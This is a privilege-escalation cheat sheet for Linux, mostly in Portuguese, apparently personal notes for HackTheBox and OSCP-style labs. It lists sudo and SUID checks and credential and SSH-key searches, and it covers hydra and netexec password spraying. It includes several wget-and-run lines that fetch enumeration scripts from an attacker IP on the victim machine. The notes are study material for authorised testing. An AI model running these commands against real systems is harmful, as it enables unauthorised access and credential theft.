Linux PrivEsc
========================

- [ ] [**Sudo access**](#sudo-access)
- [ ] [**SUID e SGID**](#suid-e-sgid)
- [ ] [**Exploração de Kernel**](#kernel-exploitation)
- [ ] [**Checar o histórico de comandos**](#check-history)
- [ ] [**Navegar nos diretórios**](#navegar-nos-diretorios)
- [ ] [**Enumerar usuários**](#enumerar-usuarios)
- [ ] [**Enumeração automática**](#automatizado)
- [ ] [**Serviços locais**](#local-services)
- [ ] [**Informações de rede**](#network-information)
- [ ] [**Tarefas agendadas**](#crontab)
- [ ] [**Enumeração de processos**](#enumeracao-de-processos)
- [ ] [**Reutilização de senha**](#reutilizacao-de-senha)
- [ ] [**Senhas em texto claro**](#senhas-em-texto-claro)


<details markdown="1"><summary markdown="1">
## Sudo access
</summary>

    sudo -i
    sudo su
    sudo -
    
    # Este temos de verificar os binários que podemos executar com permissão de root
    sudo -l

### Exemplos práticos

Vide máquina [Broker](../../../CTFs_Labs/HackTheBox/Broker#privesc) : sudo access com o binário nginx
Vide máquina [Blocky](../../../CTFs_Labs/HackTheBox/Blocky#privilege-escalation)

</details>

<details markdown="1"><summary markdown="1">
## SUID e SGID
</summary>
Com isso podemos executar o arquivo (caso seja um executável) conforme a permissão do dono do arquivo. Ou seja, se o dono do arquivo for root e o SUID bit estiver definido para o binário, podemos realizar a escalação de privilégio.

    find / -perm -u=s -type f 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null
    
Nese ponto podemos abrangeer a análise de binários aqui quando encontramos algo que seja possível ser executado por meio do usuário root. Para isso devemos considerar esta [nota]()

</details>

<details markdown="1"><summary markdown="1">
## Kernel exploitation
</summary>
<https://gabb4r.gitbook.io/oscp-notes/linux-post-exploitation/kernel-exploitation>

    wget http://10.10.14.17/4-privilege_escalation/les.sh
    chmod +x les.sh
    ./les.sh

    cat /etc/issue
    
    cat /etc/*-release
    
    uname -a
  
    cat /proc/version

Algo importante aqui na hora de escalar privilégios no sistema:

**Considerar a compilação para sistemas 32 bits**

https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
</details>

<details markdown="1"><summary markdown="1">
## CheckHistory
</summary>
    history
</details>
<details markdown="1"><summary markdown="1">
## Navegar nos diretórios
</summary>
Aqui alguns detalhes na hora de navegar nos diretórios. Temos que verificar se existem outras aplicações rodando quando temos um apache na máquina alvo, assim como credenciais em seus arquivos de configuração. Vide que é possível obter i8sso por meio dos seguintes arquivos:

    cat /opt/tomcat/conf/tomcat-users.xml
    cat /etc/apache2/sites-enabled/*.conf

    ls -al /usr/local/
    ls -al /usr/local/src
    ls -al /usr/local/bin
    ls -al /opt/
    ls -R -al /home #Fazer recursivamente neste
    ls -al /var/
    ls -al /usr/src/


OS COMANDOS AQUI SÃO EXECUTADOS TODOS NA MÁQUINA VÍTIMA
</details>
<details markdown="1"><summary markdown="1">
## Enumerar usuários
</summary>

    cat /etc/passwd
    #non-system users
    awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd

</details>

<details markdown="1"><summary markdown="1">
## Atomatizado
</summary>
### Linenum

https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

    wget http://10.10.14.17/4-privilege_escalation/LinEnum.sh -O le.sh
    chmod +x le.sh
    ./le.sh

ou 

https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh

### bangenum

è um resumo do LinEnum.sh

    wget http://10.10.14.17/4-privilege_escalation/bangenum.sh
    sed -i -e 's/\r$//' bangenum.sh
    chmod +x bangenum.sh
    ./bangenum.sh

</details>

<details markdown="1"><summary markdown="1">
## Local services
</summary>

    netstat -natl

ou

    netstat -nao
</details>

<details markdown="1"><summary markdown="1">
### Network information
</summary>

    ip a
    ifconfig
    route
    routel
    ip route
    
    netstat -napl
    netstat -naptl
    
    ss -anp

</details>

<details markdown="1"><summary markdown="1">
## Crontab
</summary>

    crontab -l
    cat /etc/crontab
    ls -lah /etc/cron* 

    grep "CRON" /var/log/cron.log

</details>

<details markdown="1"><summary markdown="1">
## Enumeração de processos
</summary>

< https://github.com/DominicBreuker/pspy>

    wget http://10.10.14.17/4-privilege_escalation/pspy32
    #ou
    wget http://10.10.14.17/4-privilege_escalation/pspy64
    chmod +x pspy64
    ./pspy64
    
</details>

<details markdown="1"><summary markdown="1">
## Reutilização de senha
</summary>
Tentar usuário e senha sendo o mesmo com hydra, por exemplo

    hydra -L user.txt -P user.txt 10.10.10.10 ssh
    hydra -L users.txt -P users.txt rdp://10.10.10.10

Tentar senha de um usuário para outro também e rockyou

    netexec ssh <hostname> -u usuarios.txt -p senhas.txt --continue

ou

    netexec ssh <hostname> -u usuarios.txt -p senhas.txt --continue --no-bruteforce

</details>

<details markdown="1"><summary markdown="1">
## Senhas em texto claro
</summary>
Procurar a string PASSWORD ou password dentro de arquivos

    grep -rnw / -e 'password\|pass\|creds\|senha\|credentials' 2>/dev/null -i

    find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

### SensitiveFileContent

    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
    
    
Nesse caso e interessante considerar que o diretorio que busco as informacoes e um diretorio de configuracoes de aplicacoes '/etc':

    grep --color=auto -rnw '/etc' -ie "PASSWORD" --color=always 2> /dev/null

In memory passwords
    
    strings /dev/mem -n10 | grep -i PASS


Generally, source code with hard coded credentials. Searcvh for php files, for examplo

### Credentials from local databases

Dump de credenciais do banco de dados

</details>

## SSH keys

    find / -name authorized_keys 2> /dev/null

    find / -name id_rsa 2> /dev/null

## Binary exploitation

User Installed Software
Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

Common locations for user installed software

    /usr/local/
    /usr/local/src
    /usr/local/bin
    /opt/
    /home
    /var/
    /usr/src/

Debian

    dpkg -l

CentOS, OpenSuse, Fedora, RHEL

    rpm -qa (CentOS / openSUSE )

OpenBSD, FreeBSD

    pkg_info


## Enumerate writable/readable

    find / -writable -type d 2>/dev/null


### Enumerate unmounted disks

    cat /etc/fstab 
    mount
    /bin/lsblk

## PATH Hijack
 
 Vide máquina [Pandora](Pandora.md#PrivEsc)